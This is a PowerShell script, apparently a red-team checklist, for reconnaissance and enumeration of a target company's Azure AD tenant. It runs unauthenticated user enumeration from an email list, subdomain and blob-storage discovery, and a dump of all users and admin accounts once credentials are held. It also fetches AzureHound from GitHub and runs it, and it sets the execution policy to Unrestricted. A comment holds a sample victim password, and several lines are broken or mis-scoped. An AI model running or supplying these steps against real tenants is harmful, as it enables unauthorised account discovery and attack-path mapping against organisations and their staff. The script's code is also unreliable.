# Execution Policy
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
Set-ExecutionPolicy Unrestricted

#Installing Basic Modules
Install-Module -Name Az -Scope CurrentUser -Repository PSGallery -Force
Install-Module -Force AzureAD -Scope CurrentUser
Install-Module -Force AADInternals -Scope CurrentUser
Install-Module MSOnline -Force
Install-Module -Name ExchangeOnlineManagement -AllowPrerelease -Force
Install-Module -Name PSWSMan -Force
apt install git
git clone https://github.com/NetSPI/MicroBurst.git
cd Microbust
Import-Module 'MicroBurst.psm1' | Unblock-File
#In kali
sudo apt install cloud-enum
# Setting Up Alias
Set-Alias -Name grep -Value Select-String
Set-Alias -Name cat -Value Get-Content
# Target Information
$domain = Read-Host -Prompt 'Enter The Target Company DomainName (Ex:Microsoft)'
function Aconnection {
       $email = Read-Host -Prompt 'Enter the Login/Email ID'
       $password = Read-Host -Prompt 'Enter the Password' -AsSecureString 
       $Cred = New-Object System.Management.Automation.PSCredential ("$email", $password) 
}

# Running Discovery & Recon
Get-AADIntLoginInformation -UserName administrator@$domain.onmicrosoft.com | Out-File $domain-output.txt
cat $domain-output.txt | grep "Domain Name" | Out-File $domain-Enumeration.txt
cat $domain-output.txt | grep "Authentication Url" | Out-File +$domain-Enumeration.txt 
Type $domain-Enumeration.txt | ForEach-Object {([string]$_).split(":")[1]} | Out-File DomainName.txt
Type .\DomainName.txt 
# Running Domain enumeration
 Invoke-AADIntReconAsOutsider -domain $domain 
#Enumerate SubDomains & Public Resources
 Invoke-EnumerateAzureSubDomains -Base $domain | Out-File Subdomain_$domain-output.txt
#Functions
#function Adomain { Type .\DomainName.txt }
 Get-AADIntTenantDomains -Domain | type .\DomainName.txt
 
#Unauthenticated Email enumeration
# Invoke user enumeration
$emailidlist = Read-Host -Prompt 'Enter The path to the email list'
Get-Content $emailidlist | Invoke-AADIntUserEnumerationAsOutsider -Method Normal
#Authenticated Test
 Connect-AzureAD -Credential $Cred
#Enumerate all users
 Get-AzureADUser -All $true | Out-File usernames.csv
 #Enumerate Email ID
 Get-AzureADUser -All $true | select UserPrincipalName | Out-File emailid-auth.csv
#Enumerate for user with admin as the principle-name
 Get-AzureADUser -SearchString "admin" | Out-File usernames_admin.csv
 Get-AzureADUser -All $true |?{$_.Displayname -match "admin"} | Out-File displaynames_admin.csv

#Blob storage Enumeration
Invoke-EnumerateAzureBlobs -Base $domain | Out-File Blob_access$domain-output.txt


#Authenticated  Enumeration

#Installing & Running AzureHound
#You would need valid user account to perform this
#Manual connection 
#Connect-AzureAD -Credential Get-Credential
# email = user@victim.com
# Password = oRSTyQnaSa62%ldxlVo3Wx&2t!
# $Cred = Get-Credential
Connect-AzureAD -Credential $Cred
wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/AzureHound.ps1 -OutFile AzureHound.ps1 -UseBasicParsing
Import-Module .\AzureHound.ps1
$path = (Get-Location).Path+"\output"
Invoke-AzureHound -OutputDirectory $path



#To connect mswxchange online
# Connect-ExchangeOnline

